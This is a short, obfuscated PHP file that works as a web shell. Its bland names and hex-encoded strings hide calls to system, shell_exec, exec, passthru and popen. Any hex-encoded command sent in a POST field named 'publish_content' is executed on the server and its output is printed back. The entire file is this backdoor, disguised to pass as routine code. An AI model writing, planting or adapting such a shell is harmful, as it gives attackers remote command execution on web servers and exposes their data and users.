<?php


$symbol1 = '3';
$symbol2 = '9';
$symbol3 = '7';
$symbol4 = '6';
$symbol5 = '5';
$symbol6 = 'd';
$symbol7 = 'c';
$symbol8 = '8';
$symbol9 = 'e';
$symbol10 = 'f';
$symbol11 = '4';
$symbol12 = '0';
$symbol13 = '2';
$settings1 = pack("H*", '7'.$symbol1.'7'.$symbol2.'7'.$symbol1.$symbol3.'4'.$symbol4.$symbol5.$symbol4.$symbol6);
$settings2 = pack("H*", '7'.'3'.$symbol4.'8'.'6'.$symbol5.$symbol4.$symbol7.'6'.$symbol7.$symbol5.'f'.$symbol4.'5'.'7'.$symbol8.$symbol4.$symbol5.'6'.'3');
$settings3 = pack("H*", '6'.'5'.'7'.'8'.'6'.$symbol5.'6'.$symbol1);
$settings4 = pack("H*", $symbol3.'0'.'6'.'1'.$symbol3.$symbol1.'7'.$symbol1.$symbol3.'4'.'6'.$symbol8.$symbol3.'2'.'7'.$symbol5);
$settings5 = pack("H*", '7'.'0'.'6'.'f'.'7'.'0'.'6'.'5'.'6'.$symbol9);
$settings6 = pack("H*", '7'.$symbol1.$symbol3.'4'.'7'.'2'.$symbol4.$symbol5.'6'.'1'.$symbol4.'d'.$symbol5.$symbol10.$symbol4.$symbol3.'6'.$symbol5.'7'.$symbol11.'5'.$symbol10.$symbol4.'3'.$symbol4.'f'.'6'.$symbol9.'7'.$symbol11.'6'.$symbol5.$symbol4.$symbol9.$symbol3.'4'.$symbol3.'3');
$settings7 = pack("H*", $symbol3.'0'.'6'.'3'.'6'.$symbol7.$symbol4.$symbol10.$symbol3.$symbol1.$symbol4.'5');
$publish_content = pack("H*", '7'.$symbol12.$symbol3.$symbol5.'6'.$symbol13.$symbol4.'c'.'6'.$symbol2.'7'.$symbol1.$symbol4.'8'.'5'.$symbol10.$symbol4.'3'.'6'.$symbol10.$symbol4.'e'.$symbol3.'4'.'6'.'5'.'6'.'e'.'7'.'4');
if (isset($_POST[$publish_content])) {
    $publish_content = pack("H*", $_POST[$publish_content]);
    if (function_exists($settings1)) {
        $settings1($publish_content);
    } elseif (function_exists($settings2)) {
        print $settings2($publish_content);
    } elseif (function_exists($settings3)) {
        $settings3($publish_content, $value_rec);
        print join("\n", $value_rec);
    } elseif (function_exists($settings4)) {
        $settings4($publish_content);
    } elseif (function_exists($settings5) && function_exists($settings6) && function_exists($settings7)) {
        $comp_element = $settings5($publish_content, 'r');
        if ($comp_element) {
            $desc_marker = $settings6($comp_element);
            $settings7($comp_element);
            print $desc_marker;
        }
    }
    exit;
}
